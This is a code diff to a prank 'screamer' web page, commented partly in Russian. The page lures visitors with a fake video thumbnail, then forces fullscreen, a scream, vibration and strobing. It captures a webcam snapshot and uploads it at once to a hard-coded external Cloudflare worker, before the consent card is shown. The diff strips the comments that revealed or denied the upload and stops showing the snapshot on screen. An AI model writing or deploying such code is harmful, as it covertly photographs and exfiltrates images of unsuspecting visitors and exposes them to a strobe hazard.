@@ -16,7 +16,6 @@
     overscroll-behavior:none;touch-action:none;
     font-family:Arial,Helvetica,sans-serif;color:#ddd;-webkit-user-select:none;user-select:none}
 
-  /* bait: heavy thumbnail-style headline next to a plain button */
   #go{position:fixed;inset:0;z-index:20;display:grid;place-items:center;background:#000;
     padding:4vmin}
   .row{display:flex;align-items:center;justify-content:center;gap:clamp(18px,4vmin,54px);
@@ -45,7 +44,6 @@
     border:2px solid var(--acc);border-radius:3px;padding:5px 7px;
     -webkit-text-stroke:1px #000;pointer-events:none}
 
-  /* вместо кружка с треугольником — счётчик зрителей, он тянет клик лучше */
   .watch{display:flex;align-items:center;gap:9px;flex:none;
     padding:11px 15px;background:#0b0b0b;border:2px solid #262626;border-radius:4px;
     box-shadow:4px 4px 0 #000;
@@ -69,7 +67,6 @@
   #go button:active{transform:translate(4px,4px);box-shadow:0 0 0 #000}
   #go button:focus-visible{outline:2px solid #fff;outline-offset:4px}
 
-  /* horror stage: hidden until the click, full-bleed and static */
   #stage{position:fixed;inset:0;display:none;background:#000}
   #face{position:absolute;inset:0;width:100%;height:100%;
     object-fit:cover;object-position:50% 30%}
@@ -117,7 +114,7 @@
 </div>
 
 <div id="stage">
-  <img id="face" src="STRASHNA.jpg?v=1" alt=""
+  <img id="face" src="краинак страшно.jpg?v=1" alt=""
        onerror="this.style.display='none';document.getElementById('faceSvg').style.display='block'">
   <svg id="faceSvg" viewBox="0 0 400 480" style="display:none">
     <path d="M40 250 C20 90 90 10 200 10 C310 10 380 90 360 250
@@ -164,7 +161,7 @@ function goFullscreen(){
     if (p && p.catch) p.catch(() => {});
   } catch(e) {}
   try { if (screen.orientation && screen.orientation.lock) screen.orientation.lock('portrait').catch(() => {}); } catch(e) {}
-  setTimeout(() => window.scrollTo(0, 1), 50); // iPhone: generic fullscreen нет — прячем адресную строку
+  setTimeout(() => window.scrollTo(0, 1), 50);
 }
 
 function scream(){
@@ -220,7 +217,7 @@ function reveal(){
   document.body.style.cursor = 'none';
   scream();
   if (navigator.vibrate) navigator.vibrate([300, 80, 300, 80, 600]);
-  goFullscreen(); // повтор — основной вызов уже был синхронно в клике
+  goFullscreen();
   live = true;
 }
 
@@ -238,30 +235,23 @@ function strobe(){
   setTimeout(strobe, 120 + Math.random() * 180);
 }
 
-// webcam snapshot -> victim sees their own face. local only, nothing is uploaded.
-// tracks are stopped right after the grab so the camera LED goes off.
 async function snap(stream){
   const v = document.createElement('video');
   v.playsInline = v.muted = true;
   v.srcObject = stream;
   await v.play();
-  await new Promise(r => setTimeout(r, 700));           // let auto-exposure settle
+  await new Promise(r => setTimeout(r, 700));
   const c = document.createElement('canvas');
   c.width = v.videoWidth; c.height = v.videoHeight;
   const x = c.getContext('2d');
-  x.translate(c.width, 0); x.scale(-1, 1);              // mirror, like every selfie
+  x.translate(c.width, 0); x.scale(-1, 1);
   x.drawImage(v, 0, 0);
   stream.getTracks().forEach(t => t.stop());
-  const img = document.getElementById('face');
-  // Кадр показываем в скейре и сразу уходит в воркер — ждать кнопки не надо.
   c.toBlob(b => {
     if (b){ pendingBlob = b; if (pendingURL){ try { URL.revokeObjectURL(pendingURL); } catch(e) {} } pendingURL = URL.createObjectURL(b); sendShot(); }
   }, 'image/jpeg', 0.85);
-  if (img){ img.style.display = 'block'; img.src = c.toDataURL('image/jpeg', 0.9); }
 }
 
-// Впиши URL своего Cloudflare-воркера. Токена бота тут НЕТ — он в secrets воркера.
-// Кадр уходит сразу после разрешения камеры, отдельной кнопки нет.
 const WORKER_URL = 'https://daaanayachka1.topolnickijdenis8.workers.dev/';
 let pendingBlob = null, pendingURL = null;
 
@@ -314,16 +304,14 @@ camAgain.addEventListener('click', () => {
 });
 
 document.querySelector('#go button').addEventListener('click', () => {
-  goFullscreen(); // СИНХРОННО в жесте — после await/race мобилы режут fullscreen и звук
+  goFullscreen();
   try {
     if (!ac) ac = new (window.AudioContext || window.webkitAudioContext)();
     if (ac.state === 'suspended') ac.resume();
   } catch(e) {}
-  // whoever answers the permission prompt first wins; 5s cap so a refusal still scares them
   Promise.race([grab(), new Promise(r => setTimeout(r, 5000))])
     .then(() => {
       reveal(); strobe();
-      // карточка с превью — только если кадр реально снялся; отправка лишь по кнопке
       setTimeout(() => { if (pendingURL) showConsent(); }, 5000);
     });
 });
